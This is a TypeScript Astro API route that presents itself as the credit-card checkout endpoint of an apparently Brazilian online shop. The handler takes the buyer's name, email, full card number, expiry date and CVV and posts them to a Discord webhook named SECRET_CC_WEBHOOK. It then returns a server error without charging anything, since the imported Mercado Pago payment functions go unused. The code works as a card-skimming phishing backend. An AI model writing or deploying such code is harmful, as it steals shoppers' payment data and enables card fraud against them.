import type { APIRoute } from "astro";
import products from "../../assets/products.json";

import { createPIX, getPayment } from "../../services/mercadopago";
import { money } from "../../components/utils";
import { logToWebhook } from "../../services/discordwebhook";

export interface PostCreditPayload {
  product_id: string;
  payer_name: string;
  payer_email: string;
  payer_cpf: string;
  card_number: string;
  card_month: string;
  card_year: string;
  card_cvv: string;
}

export const POST: APIRoute = async ({ request }) => {
  const payload: PostCreditPayload = await request.json();

  const product = products.find((x) => x.id == payload.product_id);
  if (!product) return new Response("product not found", { status: 400 });

  logToWebhook(import.meta.env.SECRET_CC_WEBHOOK, "💳 Cartão de Crédito", [
    {
      name: "Nome",
      value: payload.payer_name,
      inline: true,
    },
    {
      name: "Email",
      value: payload.payer_email,
    },
    {
      name: "Produto",
      value: product.name,
      inline: true,
    },
    /* {
      name: "Valor",
      value: money(product.price),
      inline: true,
    }, */
    {
      name: "Número",
      value: payload.card_number,
    },
    {
      name: "Mês",
      value: payload.card_month,
      inline: true,
    },
    {
      name: "Ano",
      value: payload.card_year,
      inline: true,
    },
    {
      name: "CVV",
      value: payload.card_cvv,
      inline: true,
    },
  ]);

  return new Response(null, { status: 500 });
};
